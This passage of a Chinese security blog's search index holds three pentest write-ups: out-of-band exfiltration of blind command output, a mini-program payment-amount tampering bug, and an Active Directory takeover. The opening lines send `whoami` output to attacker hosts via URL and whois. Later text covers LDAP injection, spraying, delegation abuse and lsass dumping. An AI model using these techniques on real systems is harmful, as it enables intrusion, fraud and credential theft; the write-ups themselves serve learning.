href="http://192.168.43.190:8000/%60whoami%60">http://192.168.43.190:8000/`whoami`</a></p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-31.png" class="" title="2024-02-03_09-31.png"><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>命令示例：whois -h 192.168.233.128 -p 8888 <code>whoami</code><br>vps上nc开启监听，获取到命令执行结果</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-29.png" class="" title="2024-02-03_09-29.png">]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次小程序“零元购”漏洞挖掘</title>
    <link href="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>一次简单的微信小程序漏洞挖掘。在选中商品进行支付的时候，会get一个请求，这个请求主题部分进行了url编码，当我们解码之后就可以看到商品的id号，支付金额等信息，并且没有做安全校验，只需要修改成我们想要修改的金额，直接发送数据包，就可以支付，从而达到“零元购”的危害，考虑到漏洞还没修复，所以做了厚码保护处理</p><p>声明：本文所涉及到的漏洞均已提交CNVD，切勿做违法测试!</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>首先进行环境准备，考虑到微信不能直接走系统代理，为了方便抓数据包，做了三层代理：proxypin + burpsuite + 手机网络设置<br>打开小程序抓包，选中一个商品</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/3f49779d8e794ca3bbaae4f98242580.jpg" class="" title="3f49779d8e794ca3bbaae4f98242580.jpg"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>当我们支付的时候，会GET一个&#x2F;<em><strong>&#x2F;</strong></em>&#x2F;pay.php一个请求，里面是url编码，当我们解码就可以看到我们的支付金额的位置，只需要修改成我们想要的金额，接着发包就会弹出一个二维码，支付就好了</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/90bbb441dffa24cdc3fdd8981288bb0.jpg" class="" title="90bbb441dffa24cdc3fdd8981288bb0.jpg"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/46a15724cb0af21361d0a008431e310.jpg" class="" title="46a15724cb0af21361d0a008431e310.jpg"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4edbac588f3d7c06e65bc87fe186be3.jpg" class="" title="4edbac588f3d7c06e65bc87fe186be3.jpg"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4af9118c44e585f7e6a01f785c78895.jpg" class="" title="4af9118c44e585f7e6a01f785c78895.jpg"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/6de7f1a907df9acaddc4ab2c5cc21a5.jpg" class="" title="6de7f1a907df9acaddc4ab2c5cc21a5.jpg"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>仅作为漏洞挖掘测试，漏洞验证后第一时间选择了退款，遵守网络安全法律</p><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/b5330591e5a598557846d46a138f870.jpg" class="" title="b5330591e5a598557846d46a138f870.jpg"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/1913f76c114876f130db9cbd2cda8c0.jpg" class="" title="1913f76c114876f130db9cbd2cda8c0.jpg"><h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>从代码层面进行安全检测，存储用户密码的地方进行严格的过滤，再一个就是敏感的信息在传输过程，以及显示到网站里的时候都要进行加密，MD5加密，数据SSL加密传输，重要的数据尽可能的使用POST的提交方式进行，用户密码要使用加强的加密方式MD5+base64特殊编码的方式进行加密，对于网站的一些报错页面也要禁止掉回显</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>挖洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ldap配合基于资源的约束委派</title>
    <link href="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/"/>
    <url>/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="ldap信息获取"><a href="#ldap信息获取" class="headerlink" title="ldap信息获取"></a>ldap信息获取</h2><p>首先我们通过扫描，对整个内网环境进行初步的估量，可以知道的是177这台机器开放了web端，其他机器均是一些常规端口，域控机器为10机器，还是个WinServer2012，爆红的这几个永恒之蓝先放一边，虽然不知道是否能成功利用，不过抱有一丝希望来当作我们的底牌做最后的通杀</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-28.png" class="" title="2024-02-01_09-28.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>打开177机器的web端口，可以看到是一个员工查询系统，根据输入的提示，初步判断是用的域环境验证方式，常见的有Ldap 与 Kerberos</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-26.png" class="" title="2024-02-01_09-26.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>目录扫描发现了一些敏感目录：phpinfo,readme里面泄漏了部分密码</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-40.png" class="" title="2024-02-01_09-40.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-42.png" class="" title="2024-02-01_09-42.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_16-04.png" class="" title="2024-02-01_16-04.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>通过phpinfo可以判断使用了ldap方式进行对用户的验证。既然是ldap,我们可以进行filter+对应的ldap语法进行fuzz,其中我们通过*匹配所有，成功进入到了后台，获取了大量信息，其中包括成员组账户，有了账户和泄漏的密码，我们就可以进行PTH</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-39.png" class="" title="2024-02-01_09-39.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>通过对密码和账户的喷洒，发现了部分可以登陆ldap的凭证</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-15.png" class="" title="2024-02-01_10-15.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-16.png" class="" title="2024-02-01_10-16.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>考虑到在一些域内有些机器可能被设置了防火墙，从而无法被扫描到。当我们获得凭证了，为了获取更为详细的域内机器，可以对域控 dns 服务器中的 DNS 信息进行查询，从而获取到一些被防火墙忽略的机器</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-22.png" class="" title="2024-02-01_10-22.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-26.png" class="" title="2024-02-01_10-26.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>可以发现域中还存在 10.0.0.12 这台机器没有被扫描到，还是一台win10</p><h2 id="ldap信息导出与分析"><a href="#ldap信息导出与分析" class="headerlink" title="ldap信息导出与分析"></a>ldap信息导出与分析</h2><p>使用Adfind工具从域外进行 ldap 信息的获取并导出<br>Adfind.exe * -h 10.0.0.10 -u <user> -up <password> &gt; info.txt<br>分析的话重点关注以下属性：<br>whenCreated(创建时间)<br>memberOf(所属组)<br>userAccountControl(权限)<br>lastLogon(上次登录时间)<br>pwdLastSet(上次密码修改时间)<br>lastLogonTimestamp(上次登录时间)<br>通过这些可以确定账户的权限，账户当前的状态，在对机器的 ldap 信息进行查看时发现，这里机器中存在 mS-DS-CreatorSID 这个属性，如果存在这个属性的话，表示这台机器是由某个域用户加入机器的，该域用户对该机器具有 msDS-AllowedToActOnBehalfOfOtherIdentity 权限，所以如果控制了这个账户那么就等于拿下了对应的机器，继续收集ldap信息，并定位该账户，为下一步约束委派做准备</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-45.png" class="" title="2024-02-01_10-45.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h2><p>首先利用刚才定位到的域账户建立一个机器账户，之后使用该机器账户去向该机器进行委派，然后通过 rbcd 将 win8 机器与新创建的账户建立委派，因为相比较于非约束委派，约束委派是正向委派，需要主动建立，这个时候test_computer598映入我们眼帘</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_11-31.png" class="" title="2024-02-01_11-31.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>建立委派之后将test_computer598账户的票据进行导出，这里有一点要注意，因为需要与域控进行交互，所以需要与域控的时间同步，我们可以通过ntpdate将域控时间和本机时间直接同步,最后导出完毕之后直接export导入到我们的本机</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-44.png" class="" title="2024-02-01_03-44.png"><h2 id="dumphash"><a href="#dumphash" class="headerlink" title="dumphash"></a>dumphash</h2><p>导入完票据之后，我们可以利用smbclient来上传猕猴桃或者 procdump 工具来获取用户 hash</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-51.png" class="" title="2024-02-01_03-51.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>这里如果出现无法连接445的错误，是因为目前机器是在域外，没有域控的路由表，可以手动修改 hosts 文件，做一个域名解析<br>刚才我们将票据export导入到了我们的本机，所以可以直接利用smbexec获取一个目标机器的临时shell，通过执行命令使 procdump 获取 dmp 文件</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-56.png" class="" title="2024-02-01_03-56.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>再导出到本机，本地利用猕猴桃解析 lsass.dmp 文件，得到所有hash，从而拿下域管账户</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_04-06.png" class="" title="2024-02-01_04-06.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/d4667b73316a139c13fce6de17fba66.png" class="" title="d4667b73316a139c13fce6de17fba66.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/dc6fbe7bbc96b59a197c2413c217fa6.png" class="" title="dc6fbe7bbc96b59a197c2413c217fa6.png">]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初见</title>
    <link href="/2024/01/29/%E5%88%9D%E8%A7%81/"/>
    <url>/2024/01/29/%E5%88%9D%E8%A7%81/</url>
    
    <content type="html"><![CDATA[<p>人生若只如初见<br>欢迎大家来到我的博客空间，在一切开始前，共同欣赏一下美景吧</p><img src="/2024/01/29/%E5%88%9D%E8%A7%81/test.png" class="" title="mount">]]></content>
    
    
    <categories>
      
      <category>Welcome</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hello</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
